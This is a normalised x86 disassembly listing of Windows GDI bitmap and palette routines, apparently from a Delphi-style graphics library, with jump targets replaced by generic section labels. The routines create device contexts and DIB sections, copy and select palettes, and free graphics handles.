cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44cf34
xor eax eax
push ebp
push sub_44fd43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_451578
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_44facc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_45175c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44dfac
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_430fb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d038
retn
sub_44fd50
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_44fd78
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_4055f0
sub_44fd98
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_44facc
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44fd50
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_44fdfc
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
call sub_44facc
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_44ab78
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_44facc
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
push eax
call DeleteObject
sub_44fe48
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_44ea8c
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44fef7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44ff04
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
movzx edx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_44ff50
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44facc
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_44e2f0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_44e2f0
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_4505a1
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectW
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_404204
mov [ ebp - 0x28 ] eax
xor edx edx
push ebp
push sub_4502a8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_44e1dc
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x28 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_44e2f0
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_44e2f0
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_44e2f0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_44e2f0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_450552
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_450541
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x24 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_45051f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_44e2f0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_44ff04
mov eax [ ebp - 0x28 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4043c8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_44ea8c
jmp r-xdata
mov eax [ ebp - 0x28 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x28 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x48 ]
call sub_44cd7c
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_40ab90
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x18 ]
call sub_44bb2c
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
call sub_44bb2c
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_44e248
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450526
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_44e2f0
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4504f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_44e2f0
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x28 ]
call sub_404220
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x18 ]
call sub_44bb2c
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
call sub_44bb2c
mov [ ebp - 0x30 ] eax
lea eax [ ebp - 0x34 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x28 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x18 ]
call sub_44bb2c
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
call sub_44bb2c
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_44e2f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_4061a4
call sub_4061a4
jmp r-xdata
sub_450548
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectW
sub_450557
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_406120
call sub_406174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectW
sub_4505b4
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectW
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
movzx eax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_450618
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectW
test eax eax
je r-xdata
mov eax ebx
call sub_44facc
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_450813
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_44e2f0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_44e2f0
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_44e2f0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4507cb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_44ff50
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_450824
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44f470
mov [ ebx + 0x34 ] 0x20000000
mov [ ebx + 0x39 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
inc [ eax + 0x4 ]
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_450898
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_451568
mov eax [ esi + 0x28 ]
call sub_44fd78
mov eax [ esi + 0x2c ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4312a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_4508d4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451568
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4509af
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_404c14
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45199c
mov esi ebx
mov eax [ esi + 0x28 ]
inc [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_44fd78
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
movzx eax [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
movzx eax [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
mov eax esi
call sub_451244
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_452438
movzx eax [ esi + 0x39 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x39 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4312cc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_4509e8
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_451568
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_450a78
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_4505b4
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_44ff50
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x71 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_45199c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_450a7d
mov eax [ ebp - 0x8 ]
call sub_44ab78
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_406120
call sub_406174
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_450aa8
push ebx
mov ebx eax
mov eax ebx
call sub_4510c4
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
pop ebx
retn
sub_450ae0
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_433cec
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_451568
lea eax [ ebx + 0x2c ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
push esp
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x71 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_45199c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_450b5c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
call sub_45175c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_451214
test al al
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_450df3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
